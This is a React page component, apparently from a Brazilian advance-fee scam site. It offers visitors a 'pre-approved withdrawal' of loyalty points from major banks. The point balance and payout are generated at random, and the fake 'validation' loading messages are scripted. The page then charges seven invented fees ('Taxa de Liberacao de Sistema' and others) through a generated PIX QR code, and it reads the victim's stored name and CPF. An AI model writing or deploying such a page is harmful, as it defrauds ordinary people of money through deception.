import { useState, useMemo, useEffect, useCallback } from "react";
import { useLocation, useSearch } from "wouter";
import { CheckCircle2, Shield, QrCode } from "lucide-react";
import { Button } from "@/components/ui/button";
import Header from "@/components/Header";
import PromoBar from "@/components/PromoBar";
import Footer from "@/components/Footer";
import LoadingOverlay from "@/components/LoadingOverlay";

const bancoNomes: Record<string, string> = {
  itau: "Itau",
  santander: "Santander",
  bradesco: "Bradesco",
  nubank: "Nubank",
  bb: "Banco do Brasil",
  caixa: "Caixa",
};

const taxas = [
  { nome: "Taxa de Registro Bancario", valor: 18.90 },
  { nome: "Taxa de Liberacao de Sistema", valor: 14.50 },
  { nome: "Taxa de Validacao Financeira", valor: 9.80 },
  { nome: "Taxa de Processamento", valor: 11.20 },
  { nome: "Taxa de Seguranca Digital", valor: 7.90 },
  { nome: "Taxa de Autenticacao", valor: 6.40 },
  { nome: "Taxa Administrativa", valor: 9.42 },
];

const TOTAL_TAXAS = taxas.reduce((sum, t) => sum + t.valor, 0);

const loadingMessages = [
  "Conectando ao banco de dados...",
  "Validando informacoes...",
  "Consultando sistema financeiro...",
  "Preparando liberacao...",
];

type Step = "saque" | "loading-taxas" | "taxas" | "loading-pix" | "pix";

export default function Confirmacao() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const tipo = params.get("tipo") || "milhas";
  const banco = params.get("banco") || "";

  const [step, setStep] = useState<Step>("saque");
  const [loadingText, setLoadingText] = useState(loadingMessages[0]);

  const [qrCodeBase64, setQrCodeBase64] = useState<string | null>(null);
  const [copiaECola, setCopiaECola] = useState<string | null>(null);
  const [pixError, setPixError] = useState<string | null>(null);

  const bancoNome = bancoNomes[banco] || banco;
  const nomeUsuario = useMemo(() => localStorage.getItem("nomeUsuario") || "", []);
  const cpfUsuario = useMemo(() => localStorage.getItem("cpfUsuario") || "", []);

  const pontos = useMemo(() => {
    const saved = localStorage.getItem("pontosUsuario");
    if (saved) return parseInt(saved, 10);
    const generated = Math.floor(Math.random() * (150000 - 20000 + 1)) + 20000;
    localStorage.setItem("pontosUsuario", String(generated));
    return generated;
  }, []);

  const percentual = useMemo(() => Math.random() * (0.06 - 0.03) + 0.03, []);
  const valorSaque = pontos * percentual;
  const protocolo = useMemo(() => Math.random().toString(36).substring(2, 10).toUpperCase(), []);

  useEffect(() => {
    if (step !== "loading-taxas") return;
    let i = 0;
    const interval = setInterval(() => {
      i = (i + 1) % loadingMessages.length;
      setLoadingText(loadingMessages[i]);
    }, 1000);
    const timer = setTimeout(() => {
      clearInterval(interval);
      setStep("taxas");
    }, 4000);
    return () => { clearInterval(interval); clearTimeout(timer); };
  }, [step]);

  useEffect(() => {
    if (!localStorage.getItem("cpfUsuario")) {
      setLocation("/");
    }
  }, [setLocation]);

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: "smooth" });
  }, [step]);

  const handleSolicitar = useCallback(() => {
    setLoadingText(loadingMessages[0]);
    setStep("loading-taxas");
  }, []);

  const handlePagarPix = useCallback(async () => {
    setStep("loading-pix");
    setPixError(null);

    try {
      const response = await fetch("/api/create-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: Math.round(TOTAL_TAXAS * 100), // envia em centavos
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Erro ao gerar PIX");
      }

      setQrCodeBase64(data.qrCodeBase64);
      setCopiaECola(data.copiaECola);

      setStep("pix");
    } catch (error: any) {
      setPixError(error.message);
      setStep("taxas");
    }
  }, []);

  const copiarPix = () => {
    if (!copiaECola) return;
    navigator.clipboard.writeText(copiaECola);
    alert("Codigo PIX copiado!");
  };

  return (
    <div className="min-h-screen bg-[#F6F6F6] flex flex-col" data-testid="confirmacao-page">
      <PromoBar />
      <Header />

      <main className="flex-1 py-12 px-4">
        <div className="max-w-lg mx-auto text-center">

          {step === "saque" && (
            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
              <h1 className="text-2xl font-bold text-[#222222] mb-2">
                Saque Pre-Aprovado Disponivel
              </h1>

              <Button
                onClick={handleSolicitar}
                className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mb-4"
              >
                Solicitar Valor
              </Button>
            </div>
          )}

          {step === "taxas" && (
            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
              <h2 className="text-xl font-bold text-[#222222] mb-2">
                Taxas para Liberacao do Saque
              </h2>

              <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-6">
                <h3 className="text-2xl font-bold text-[#EC008C]">
                  R$ {TOTAL_TAXAS.toFixed(2).replace(".", ",")}
                </h3>
              </div>

              {pixError && (
                <p className="text-red-500 mb-4">{pixError}</p>
              )}

              <Button
                onClick={handlePagarPix}
                className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full"
              >
                Pagar com PIX
              </Button>
            </div>
          )}

          {step === "pix" && (
            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
              <div className="w-16 h-16 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-5">
                <QrCode className="w-8 h-8 text-[#EC008C]" />
              </div>

              <h3 className="text-xl font-bold text-[#222222] mb-2">
                Pagamento via PIX
              </h3>

              {qrCodeBase64 && (
                <div className="flex justify-center mb-5">
                  <img
                    src={`data:image/png;base64,${qrCodeBase64}`}
                    alt="QR Code PIX"
                    className="w-[220px] h-[220px] rounded-lg border border-[#E5E5E5]"
                  />
                </div>
              )}

              {copiaECola && (
                <div className="mb-5">
                  <textarea
                    readOnly
                    value={copiaECola}
                    className="w-full border rounded-lg p-3 text-xs"
                  />
                  <Button
                    onClick={copiarPix}
                    className="w-full mt-3 bg-[#E0007A] text-white rounded-full"
                  >
                    Copiar Codigo PIX
                  </Button>
                </div>
              )}

              <div className="flex items-center justify-center gap-2 mb-6">
                <div className="w-2 h-2 rounded-full bg-[#EC008C] animate-pulse" />
                <p className="text-sm text-[#6F6F6F] font-medium">
                  Aguardando confirmacao...
                </p>
              </div>
            </div>
          )}
        </div>
      </main>

      <Footer />

      <LoadingOverlay
        visible={step === "loading-taxas"}
        title="Validando solicitacao..."
        subtitle={loadingText}
        duration={4000}
      />

      <LoadingOverlay
        visible={step === "loading-pix"}
        title="Gerando pagamento PIX..."
        subtitle="Conectando ao sistema de pagamentos..."
        duration={3500}
      />
    </div>
  );
}